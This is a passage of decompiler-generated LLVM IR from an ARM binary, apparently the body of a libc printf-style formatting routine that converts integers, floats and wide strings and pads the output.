  %v0_1143086 = phi i32 [ %v5_113e4, %.thread84 ], [ %v4_113b8, %bb140 ], [ %v4_113b8, %dec_label_pc_113f8 ]
  br label %dec_label_pc_11408

dec_label_pc_11408:                               ; preds = %dec_label_pc_113f8, %dec_label_pc_11404
  %v0_1143085 = phi i32 [ %v0_1143086, %dec_label_pc_11404 ], [ %v4_113b8, %dec_label_pc_113f8 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_11404 ], [ 6, %dec_label_pc_113f8 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_11408 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_11408, i32* %r3.global-to-local, align 4
  %v1_1140c = icmp slt i32 %v3_11408, 0
  %v7_11410. = select i1 %v1_1140c, i32 %v7_11410, i32 32
  store i32 %v7_11410., i32* @sb, align 4
  br i1 %v7_11418, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_11408
  store i32 %v2_11364, i32* @lr, align 4
  %v2_11420 = load i32, i32* %ip.global-to-local, align 4
  %v5_11420 = mul i32 %v2_11420, 4
  %v6_11420 = add i32 %v5_11420, %v2_11364
  store i32 %v6_11420, i32* %r3.global-to-local, align 4
  %v2_11424 = add i32 %v6_11420, -260
  %v3_11424 = inttoptr i32 %v2_11424 to i32*
  %v4_11424 = load i32, i32* %v3_11424, align 4
  store i32 %v4_11424, i32* %r3.global-to-local, align 4
  %v2_1142c = and i32 %v4_11424, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_11408, %.thread16
  %storemerge94 = phi i32 [ %v2_1142c, %.thread16 ], [ 1024, %dec_label_pc_11408 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_1143085, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_11438 = call i32 @_load_inttype()
  %v0_1143c = load i32, i32* @r1, align 4
  store i32 %v0_1143c, i32* %r2.global-to-local, align 4
  %v0_11448 = load i32, i32* @r4, align 4
  store i32 %v0_11448, i32* %r3.global-to-local, align 4
  store i32 %v2_1144c, i32* %r0.global-to-local, align 4
  %v0_11450 = load i32, i32* @r5, align 4
  %v6_11454 = call i32 @_uintmaxtostr(i8* %v5_11454, i32 %v0_11438, i32 %v0_1143c, i32 %v0_11448, i32 %v0_11450)
  store i32 %v6_11454, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_11454, i32* @r6, align 4
  br i1 %v3_11464, label %bb148, label %dec_label_pc_11468

dec_label_pc_11468:                               ; preds = %bb145
  %v7_11454 = inttoptr i32 %v6_11454 to i8*
  %v3_11468 = load i8, i8* %v7_11454, align 1
  %v7_1146c = icmp eq i8 %v3_11468, 45
  %v2_11474 = or i32 %v0_113d8, 2
  %v2_11474.stack_var_-316.4 = select i1 %v7_1146c, i32 %v2_11474, i32 %v0_113d8
  store i32 %v2_11474.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_1146c, label %.thread18, label %dec_label_pc_11488

.thread18:                                        ; preds = %dec_label_pc_11468
  %v3_11478 = add i32 %v6_11454, 1
  store i32 %v3_11478, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_11488:                               ; preds = %dec_label_pc_11468
  %v1_11488 = and i32 %v2_11474.stack_var_-316.4, 2
  %v2_11488 = icmp eq i32 %v1_11488, 0
  br i1 %v2_11488, label %dec_label_pc_11494, label %bb146

bb146:                                            ; preds = %dec_label_pc_11488
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_11494:                               ; preds = %dec_label_pc_11488
  %v1_11494 = urem i32 %v2_11474.stack_var_-316.4, 2
  %v2_11494 = icmp eq i32 %v1_11494, 0
  br i1 %v2_11494, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_11494
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_11494, %bb147
  %v0_114f0 = phi i32 [ %v6_11454, %bb145 ], [ %v3_11478, %.thread18 ], [ %v6_11454, %dec_label_pc_11494 ], [ %v6_11454, %bb147 ], [ %v6_11454, %bb146 ]
  %v0_114ac = phi i32 [ %v0_113d8, %bb145 ], [ %v2_11474, %.thread18 ], [ %v0_113d8, %dec_label_pc_11494 ], [ %v0_113d8, %bb147 ], [ %v0_113d8, %bb146 ]
  %v3_1149c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_1149c, i32* %r2.global-to-local, align 4
  store i32 %v0_114ac, i32* %r3.global-to-local, align 4
  %v1_114a4 = icmp slt i32 %v3_1149c, 0
  br i1 %v1_114a4, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_114d4 = phi i32 [ %v3_1149c, %bb148 ], [ 1, %bb149 ]
  %v1_114ac = and i32 %v0_114ac, 16
  %v2_114ac = icmp eq i32 %v1_114ac, 0
  store i32 %v2_11680, i32* %r3.global-to-local, align 4
  %v2_114b4 = sub i32 %v2_11680, %v0_114f0
  %v1_114b8 = add i32 %v2_114b4, 127
  store i32 %v1_114b8, i32* @r5, align 4
  br i1 %v2_114ac, label %bb157, label %dec_label_pc_114c0

dec_label_pc_114c0:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_114c0
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_114c0, %bb151
  br i1 %v7_114cc, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_114d4, %v1_114b8
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_114d8, label %dec_label_pc_114e0, label %bb157

dec_label_pc_114e0:                               ; preds = %bb155
  %v1_114e0 = inttoptr i32 %v0_114f0 to i8*
  %v2_114e0 = load i8, i8* %v1_114e0, align 1
  %v3_114e0 = zext i8 %v2_114e0 to i32
  store i32 %v3_114e0, i32* %r3.global-to-local, align 4
  %v7_114e4 = icmp eq i8 %v2_114e0, 48
  br i1 %v7_114e4, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_114e0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_114e0
  %v2_114ec = add i32 %v2_114b4, 128
  store i32 %v2_114ec, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_11528 = phi i32 [ %v0_114d4, %bb155 ], [ %v0_114d4, %bb150 ], [ 1, %bb156 ], [ %v2_114ec, %.thread25 ], [ %v0_114d4, %bb154 ]
  %v1_114f0 = inttoptr i32 %v0_114f0 to i8*
  %v2_114f0 = load i8, i8* %v1_114f0, align 1
  %v3_114f0 = zext i8 %v2_114f0 to i32
  store i32 %v3_114f0, i32* %r3.global-to-local, align 4
  %v7_114f4 = icmp eq i8 %v2_114f0, 48
  br i1 %v7_114f4, label %dec_label_pc_114fc, label %dec_label_pc_11524

dec_label_pc_114fc:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_11500 = load i32, i32* @r7, align 4
  %v7_11504 = icmp slt i32 %v0_11500, 6
  br i1 %v7_11504, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_114fc
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_114fc, %bb158
  br i1 %v7_11418, label %.thread26, label %dec_label_pc_11518

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1d640.597 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_11698

dec_label_pc_11518:                               ; preds = %bb159
  %v2_11518 = icmp eq i32 %v5_11528, 0
  br i1 %v2_11518, label %bb160, label %dec_label_pc_11524

bb160:                                            ; preds = %dec_label_pc_11518
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11698

dec_label_pc_11524:                               ; preds = %dec_label_pc_11518, %bb157
  %v2_11524 = sub i32 %v5_11528, %v1_114b8
  %tmp199 = icmp ugt i32 %v5_11528, %v1_114b8
  br i1 %tmp199, label %.thread90, label %dec_label_pc_11698

.thread90:                                        ; preds = %dec_label_pc_11524
  store i32 %v2_11524, i32* @r4, align 4
  br label %dec_label_pc_116b4thread-pre-split

dec_label_pc_11534:                               ; preds = %dec_label_pc_113a8
  br i1 %tmp196, label %dec_label_pc_11570, label %dec_label_pc_1153c

dec_label_pc_1153c:                               ; preds = %dec_label_pc_11534
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_11548 = load i32, i32* @fp, align 4
  store i32 %v0_11548, i32* %r0.global-to-local, align 4
  %v2_1154c = load i32, i32* %v1_11390, align 4
  %v5_1154c = load i32, i32* %v4_1154c, align 4
  store i32 %v5_1154c, i32* %r2.global-to-local, align 4
  store i32 %v2_11550, i32* %r3.global-to-local, align 4
  %v5_11554 = sext i32 %v2_1154c to i64
  %v6_11554 = bitcast i64 %v5_11554 to double
  %v7_11554 = call i32 @_fpmaxtostr(i32 %v0_11548, double %v6_11554, i32 %v5_1154c, i32 %v2_11550, i32 70068)
  store i32 %v7_11554, i32* %r0.global-to-local, align 4
  %v1_11558 = icmp slt i32 %v7_11554, 0
  br i1 %v1_11558, label %dec_label_pc_11804, label %dec_label_pc_11560

dec_label_pc_11560:                               ; preds = %dec_label_pc_1153c
  %v2_11564 = add i32 %v7_11554, %stack_var_-336.2
  store i32 %v2_11564, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_117f0

dec_label_pc_11570:                               ; preds = %dec_label_pc_11534
  br i1 %v3_11574, label %dec_label_pc_11610, label %dec_label_pc_11578

dec_label_pc_11578:                               ; preds = %dec_label_pc_11570
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_11570, label %dec_label_pc_11588, label %dec_label_pc_115d8

dec_label_pc_11588:                               ; preds = %dec_label_pc_11578
  %v2_11588 = load i32, i32* %v1_11390, align 4
  store i32 %v2_11588, i32* %r3.global-to-local, align 4
  %v9_1158c = icmp eq i32 %v2_11588, 0
  store i32 %v2_11588, i32* %stack_var_-44, align 4
  br i1 %v9_1158c, label %dec_label_pc_116a0, label %dec_label_pc_11598

dec_label_pc_11598:                               ; preds = %dec_label_pc_11588
  %v3_11598 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_11598, i32* %r3.global-to-local, align 4
  store i32 %v2_1159c, i32* @r0, align 4
  %v5_115a8 = icmp slt i32 %v3_11598, -1
  br i1 %v5_115a8, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_11598
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_11598, %bb161
  %storemerge193 = phi i32 [ %v3_11598, %bb161 ], [ -1, %dec_label_pc_11598 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_1159c, i32* @r1, align 4
  store i32 %v2_115b0, i32* %r3.global-to-local, align 4
  %v0_115b4 = call i32 @__GI_wcsrtombs()
  store i32 %v0_115b4, i32* %r0.global-to-local, align 4
  %v7_115b8 = icmp eq i32 %v0_115b4, -1
  store i32 %v0_115b4, i32* @r5, align 4
  br i1 %v7_115b8, label %dec_label_pc_11804, label %dec_label_pc_115c4

dec_label_pc_115c4:                               ; preds = %bb162
  %v0_115c4 = load i32, i32* @sl, align 4
  store i32 %v0_115c4, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_115c4, i32* @r6, align 4
  br label %dec_label_pc_116b4

dec_label_pc_115d8:                               ; preds = %dec_label_pc_11578
  store i32 %v2_11680, i32* %r8.global-to-local, align 4
  %v2_115dc = load i32, i32* %v1_11390, align 4
  store i32 %v2_115b0, i32* %r2.global-to-local, align 4
  store i32 %v2_11680, i32* %r0.global-to-local, align 4
  %v3_115e8 = call i32 @__GI_wcrtomb(i32 %v2_11680, i32 %v2_115dc, i32 %v2_115b0)
  store i32 %v3_115e8, i32* %r0.global-to-local, align 4
  %v7_115ec = icmp eq i32 %v3_115e8, -1
  store i32 %v3_115e8, i32* @r5, align 4
  br i1 %v7_115ec, label %dec_label_pc_11804, label %dec_label_pc_115f8

dec_label_pc_115f8:                               ; preds = %dec_label_pc_115d8
  %v0_115f8 = load i32, i32* @sl, align 4
  store i32 %v0_115f8, i32* @r4, align 4
  store i32 %v2_11680, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_11608 = trunc i32 %v0_115f8 to i8
  %v2_11608 = load i32, i32* %r8.global-to-local, align 4
  %v4_11608 = add i32 %v2_11608, %v3_115e8
  %v5_11608 = inttoptr i32 %v4_11608 to i8*
  store i8 %v1_11608, i8* %v5_11608, align 1
  %v0_116b8.pre.pre = load i32, i32* @r5, align 4
  %v1_116b8.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_116b4thread-pre-split

dec_label_pc_11610:                               ; preds = %dec_label_pc_11570
  br i1 %v3_11614, label %dec_label_pc_11674, label %dec_label_pc_11618

dec_label_pc_11618:                               ; preds = %dec_label_pc_11610
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_11620 = load i32, i32* %v1_11390, align 4
  br i1 %v7_11610, label %dec_label_pc_11620, label %dec_label_pc_1164c

dec_label_pc_11620:                               ; preds = %dec_label_pc_11618
  store i32 %v2_11620, i32* @r6, align 4
  %v2_11624 = icmp eq i32 %v2_11620, 0
  br i1 %v2_11624, label %dec_label_pc_116a0, label %dec_label_pc_1162c

dec_label_pc_1162c:                               ; preds = %dec_label_pc_11620, %dec_label_pc_1167c
  %v0_1163c = phi i32 [ %v2_11620, %dec_label_pc_11620 ], [ %v3_1168c, %dec_label_pc_1167c ]
  %v3_1162c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_1162c, i32* %r3.global-to-local, align 4
  %v5_11638 = icmp slt i32 %v3_1162c, -1
  br i1 %v5_11638, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_1162c
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_1162c, %bb163
  %storemerge194 = phi i32 [ %v3_1162c, %bb163 ], [ -1, %dec_label_pc_1162c ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_1163c, i32* %r0.global-to-local, align 4
  %v1_11640 = inttoptr i32 %v0_1163c to i8*
  %v2_11640 = call i32 @strnlen(i8* %v1_11640)
  store i32 %v2_11640, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116a8

dec_label_pc_1164c:                               ; preds = %dec_label_pc_11618
  store i32 %v2_11620, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_11680, i32* @r6, align 4
  store i32 %v2_11620, i32* %stack_var_-180, align 4
  br label %dec_label_pc_116b4thread-pre-split

dec_label_pc_11674:                               ; preds = %dec_label_pc_11610
  br i1 %v7_11674, label %dec_label_pc_1167c, label %dec_label_pc_11804

dec_label_pc_1167c:                               ; preds = %dec_label_pc_11674
  %v0_1167c = call i32 @__errno_location()
  store i32 %v0_1167c, i32* %r0.global-to-local, align 4
  %v1_11684 = inttoptr i32 %v0_1167c to i32*
  %v2_11684 = load i32, i32* %v1_11684, align 4
  store i32 %v2_11684, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_1168c = call i32 @__GI___glibc_strerror_r(i32 %v2_11684, i32 %v2_11680, i32 128)
  store i32 %v3_1168c, i32* %r0.global-to-local, align 4
  store i32 %v3_1168c, i32* @r6, align 4
  br label %dec_label_pc_1162c

dec_label_pc_11698:                               ; preds = %dec_label_pc_11524, %.thread26, %bb160
  %v0_116b8.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_114b8, %dec_label_pc_11524 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_116b4thread-pre-split

dec_label_pc_116a0:                               ; preds = %dec_label_pc_11620, %dec_label_pc_11588
  store i32 ptrtoint ([7 x i8]* @global_var_1d648.600 to i32), i32* @r6, align 4
  br label %dec_label_pc_116a8

dec_label_pc_116a8:                               ; preds = %bb164, %dec_label_pc_116a0
  %storemerge = phi i32 [ 6, %dec_label_pc_116a0 ], [ %v2_11640, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_116b4

dec_label_pc_116b4thread-pre-split:               ; preds = %.thread90, %dec_label_pc_115f8, %dec_label_pc_1164c, %dec_label_pc_11698
  %v1_116b8.pre = phi i32 [ 0, %dec_label_pc_11698 ], [ %v1_116b8.pre.pre, %dec_label_pc_115f8 ], [ 0, %dec_label_pc_1164c ], [ %v2_11524, %.thread90 ]
  %v0_116b8.pre = phi i32 [ %v0_116b8.pre81, %dec_label_pc_11698 ], [ %v0_116b8.pre.pre, %dec_label_pc_115f8 ], [ 1, %dec_label_pc_1164c ], [ %v1_114b8, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_114ac, %dec_label_pc_11698 ], [ %v0_113d8, %dec_label_pc_115f8 ], [ %v0_113d8, %dec_label_pc_1164c ], [ %v0_114ac, %.thread90 ]
  %v0_116b4.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_116b4

dec_label_pc_116b4:                               ; preds = %dec_label_pc_116b4thread-pre-split, %dec_label_pc_115c4, %dec_label_pc_116a8
  %v1_116f4 = phi i32 [ %v1_116b8.pre, %dec_label_pc_116b4thread-pre-split ], [ %v0_115c4, %dec_label_pc_115c4 ], [ 0, %dec_label_pc_116a8 ]
  %v0_116b8 = phi i32 [ %v0_116b8.pre, %dec_label_pc_116b4thread-pre-split ], [ %v0_115b4, %dec_label_pc_115c4 ], [ %storemerge, %dec_label_pc_116a8 ]
  %v0_116c0 = phi i32 [ %v0_116b4.pr, %dec_label_pc_116b4thread-pre-split ], [ 11, %dec_label_pc_115c4 ], [ 11, %dec_label_pc_116a8 ]
  %v0_116fc = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_116b4thread-pre-split ], [ %v0_113d8, %dec_label_pc_115c4 ], [ %v0_113d8, %dec_label_pc_116a8 ]
  %v7_116b4 = icmp eq i32 %v0_116c0, 11
  %v2_116b8 = add i32 %v0_116b8, %v1_116f4
  br i1 %v7_116b4, label %dec_label_pc_116d0, label %bb165

bb165:                                            ; preds = %dec_label_pc_116b4
  %v7_116c8 = icmp sgt i32 %v0_116c0, 5
  %. = select i1 %v7_116c8, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_116cc = add i32 %., %v2_116b8
  br label %dec_label_pc_116d0

dec_label_pc_116d0:                               ; preds = %dec_label_pc_116b4, %bb165
  %v0_116e4 = phi i32 [ %v2_116b8, %dec_label_pc_116b4 ], [ %v2_116cc, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_116d4 = sub i32 %tmp97, %v0_116e4
  %v3_116d4 = icmp uge i32 %tmp97, %v0_116e4
  %v9_116d4 = icmp eq i32 %tmp97, %v0_116e4
  %v2_116d8 = xor i1 %v3_116d4, true
  %v3_116d8 = or i1 %v9_116d4, %v2_116d8
  br i1 %v3_116d8, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_116d0
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_116d0, %bb166
  %v2_116dc = xor i1 %v9_116d4, true
  %v3_116dc = and i1 %v3_116d4, %v2_116dc
  br i1 %v3_116dc, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_116e4.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_116d4, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_116f4 = phi i32 [ %v1_116e4.pre, %._crit_edge ], [ %v2_116d4, %bb168 ]
  %v2_116e4 = add i32 %v0_116e4, %stack_var_-336.2
  %v2_116e8 = add i32 %v2_116e4, %v2_116f4
  store i32 %v2_116e8, i32* %ip.global-to-local, align 4
  store i32 %v0_116fc, i32* %r3.global-to-local, align 4
  %v0_116f0 = load i32, i32* @sb, align 4
  %v7_116f0 = icmp eq i32 %v0_116f0, 48
  br i1 %v7_116f0, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_116f4 = add i32 %v2_116f4, %v1_116f4
  store i32 %v3_116f4, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_11710 = phi i32 [ %v2_116f4, %bb169 ], [ 0, %bb170 ]
  %v1_116fc = and i32 %v0_116fc, 8
  store i32 %v1_116fc, i32* @r8, align 4
  %v2_116fc = icmp eq i32 %v1_116fc, 0
  br i1 %v2_116fc, label %dec_label_pc_11708, label %dec_label_pc_11724

dec_label_pc_11708:                               ; preds = %.thread29
  %v0_11708 = load i32, i32* @fp, align 4
  store i32 %v0_11708, i32* %r0.global-to-local, align 4
  store i32 %v0_11710, i32* %r2.global-to-local, align 4
  %v4_11714 = call i32 @_charpad(i32 %v0_11708, i8 32, i32 %v0_11710)
  store i32 %v4_11714, i32* %r0.global-to-local, align 4
  %v1_11718 = load i32, i32* @sl, align 4
  %v9_11718 = icmp eq i32 %v4_11714, %v1_11718
  br i1 %v9_11718, label %dec_label_pc_11720, label %dec_label_pc_11804

dec_label_pc_11720:                               ; preds = %dec_label_pc_11708
  %v0_11720 = load i32, i32* @r8, align 4
  store i32 %v0_11720, i32* @sl, align 4
  %v0_1172c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11724

dec_label_pc_11724:                               ; preds = %.thread29, %dec_label_pc_11720
  %v0_1172c = phi i32 [ %v0_116c0, %.thread29 ], [ %v0_1172c.pre, %dec_label_pc_11720 ]
  %v0_11728 = load i32, i32* @fp, align 4
  %v2_1172c = add i32 %v0_1172c, ptrtoint (i32* @global_var_1d650.602 to i32)
  store i32 %v2_1172c, i32* %r0.global-to-local, align 4
  %v2_11730 = inttoptr i32 %v2_1172c to i8*
  %v3_11730 = call i32 @__GI_fputs_unlocked(i8* %v2_11730, i32 %v0_11728)
  %v0_11734 = load i32, i32* @fp, align 4
  store i32 %v0_11734, i32* %r0.global-to-local, align 4
  %v0_1173c = load i32, i32* @r4, align 4
  store i32 %v0_1173c, i32* %r2.global-to-local, align 4
  %v4_11740 = call i32 @_charpad(i32 %v0_11734, i8 48, i32 %v0_1173c)
  store i32 %v4_11740, i32* %r0.global-to-local, align 4
  %v1_11744 = load i32, i32* @r4, align 4
  %v9_11744 = icmp eq i32 %v4_11740, %v1_11744
  br i1 %v9_11744, label %dec_label_pc_1174c, label %dec_label_pc_11804

dec_label_pc_1174c:                               ; preds = %dec_label_pc_11724
  %v3_1174c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1174c, i32* %r3.global-to-local, align 4
  %v2_11750 = icmp eq i32 %v3_1174c, 0
  br i1 %v2_11750, label %dec_label_pc_11760, label %dec_label_pc_117c0thread-pre-split

dec_label_pc_11760:                               ; preds = %dec_label_pc_1174c
  %v0_11760 = load i32, i32* @r5, align 4
  %v2_11760 = icmp eq i32 %v0_11760, 0
  br i1 %v2_11760, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_11760
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_11760
  %v1_11768 = load i32, i32* @r6, align 4
  store i32 %v1_11768, i32* %r0.global-to-local, align 4
  %v1_11770 = load i32, i32* @fp, align 4
  store i32 %v1_11770, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 71544, i32* @lr, align 4
  %v1_11774 = xor i1 %v2_11760, true
  call void @__pseudo_cond_branch(i1 %v1_11774, i32 ptrtoint (i32* @global_var_14e7c.593 to i32))
  %v0_11778 = load i32, i32* %r0.global-to-local, align 4
  %v1_11778 = load i32, i32* @r5, align 4
  %v9_11778 = icmp eq i32 %v0_11778, %v1_11778
  br i1 %v9_11778, label %dec_label_pc_117d8, label %dec_label_pc_11804

dec_label_pc_11784:                               ; preds = %dec_label_pc_117c0
  %v2_11784 = icmp ult i32 %v1_11788, 128
  %.v1_11788 = select i1 %v2_11784, i32 %v1_11788, i32 128
  store i32 %.v1_11788, i32* @r2, align 4
  %v0_11790 = call i32 @__GI_wcsrtombs()
  store i32 %v0_11790, i32* @r4, align 4
  %v2_11794 = icmp eq i32 %v0_11790, 0
  store i32 %v0_11790, i32* %r3.global-to-local, align 4
  store i32 %v2_11680, i32* %r0.global-to-local, align 4
  %v0_117a4 = load i32, i32* @fp, align 4
  store i32 %v0_117a4, i32* %r2.global-to-local, align 4
  br i1 %v2_11794, label %dec_label_pc_117b4, label %dec_label_pc_117ac

dec_label_pc_117ac:                               ; preds = %dec_label_pc_11784
  %v3_117ac = call i32 @__stdio_fwrite(i32 %v2_11680, i32 %v0_11790, i32 %v0_117a4)
  store i32 %v3_117ac, i32* %r0.global-to-local, align 4
  store i32 %v3_117ac, i32* %r3.global-to-local, align 4
  %v1_117b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_117b4

dec_label_pc_117b4:                               ; preds = %dec_label_pc_11784, %dec_label_pc_117ac
  %v1_117b4 = phi i32 [ 0, %dec_label_pc_11784 ], [ %v1_117b4.pre, %dec_label_pc_117ac ]
  %v0_117b8 = phi i32 [ 0, %dec_label_pc_11784 ], [ %v3_117ac, %dec_label_pc_117ac ]
  %v9_117b4 = icmp eq i32 %v0_117b8, %v1_117b4
  %v1_117b8 = load i32, i32* @r5, align 4
  %v2_117b8 = sub i32 %v1_117b8, %v0_117b8
  store i32 %v2_117b8, i32* @r5, align 4
  br i1 %v9_117b4, label %dec_label_pc_117c0, label %dec_label_pc_11804

dec_label_pc_117c0thread-pre-split:               ; preds = %dec_label_pc_1174c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_117c4.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_117c0

dec_label_pc_117c0:                               ; preds = %dec_label_pc_117c0thread-pre-split, %dec_label_pc_117b4
  %v1_11788 = phi i32 [ %v0_117c4.pr, %dec_label_pc_117c0thread-pre-split ], [ %v2_117b8, %dec_label_pc_117b4 ]
  store i32 %v2_11680, i32* @r6, align 4
  %v2_117c4 = icmp eq i32 %v1_11788, 0
  store i32 %v2_1159c, i32* @r1, align 4
  store i32 %v2_115b0, i32* %r3.global-to-local, align 4
  store i32 %v2_11680, i32* @r0, align 4
  br i1 %v2_117c4, label %dec_label_pc_117d8, label %dec_label_pc_11784

dec_label_pc_117d8:                               ; preds = %dec_label_pc_117c0, %.thread36
  %v0_117d8 = load i32, i32* @fp, align 4
  store i32 %v0_117d8, i32* %r0.global-to-local, align 4
  %v0_117e0 = load i32, i32* @sl, align 4
  store i32 %v0_117e0, i32* %r2.global-to-local, align 4
  %v4_117e4 = call i32 @_charpad(i32 %v0_117d8, i8 32, i32 %v0_117e0)
  store i32 %v4_117e4, i32* %r0.global-to-local, align 4
  %v1_117e8 = load i32, i32* @sl, align 4
  %v9_117e8 = icmp eq i32 %v4_117e4, %v1_117e8
  br i1 %v9_117e8, label %dec_label_pc_117f0, label %dec_label_pc_11804

dec_label_pc_117f0:                               ; preds = %dec_label_pc_117d8, %dec_label_pc_11560, %dec_label_pc_11384
  %stack_var_-316.3 = phi i32 [ %v0_113d8, %dec_label_pc_11384 ], [ %v0_116fc, %dec_label_pc_117d8 ], [ %v0_113d8, %dec_label_pc_11560 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_11384 ], [ %v2_116e8, %dec_label_pc_117d8 ], [ %v2_11564, %dec_label_pc_11560 ]
  %v3_117f0 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_117f0, i32* @r4, align 4
  br label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_11294, %dec_label_pc_117f0
  %v0_117f4 = phi i32 [ %v0_117f4.pre, %dec_label_pc_11294 ], [ %v3_117f0, %dec_label_pc_117f0 ]
  %v0_113d8 = phi i32 [ %tmp100, %dec_label_pc_11294 ], [ %stack_var_-316.3, %dec_label_pc_117f0 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_11294 ], [ %stack_var_-336.3, %dec_label_pc_117f0 ]
  store i32 %v0_117f4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_112ac.outer

dec_label_pc_112ac.outer:                         ; preds = %dec_label_pc_117fc, %dec_label_pc_117f4
  %v5_112d8 = phi i32 [ %v1_11308, %dec_label_pc_117fc ], [ %v0_117f4, %dec_label_pc_117f4 ]
  %v0_112ac49 = phi i32 [ %v1_117fc, %dec_label_pc_117fc ], [ %v0_117f4, %dec_label_pc_117f4 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_117fc ], [ %stack_var_-336.4, %dec_label_pc_117f4 ]
  %v1_112ac180 = inttoptr i32 %v0_112ac49 to i8*
  %v2_112ac181 = load i8, i8* %v1_112ac180, align 1
  %v3_112ac182 = zext i8 %v2_112ac181 to i32
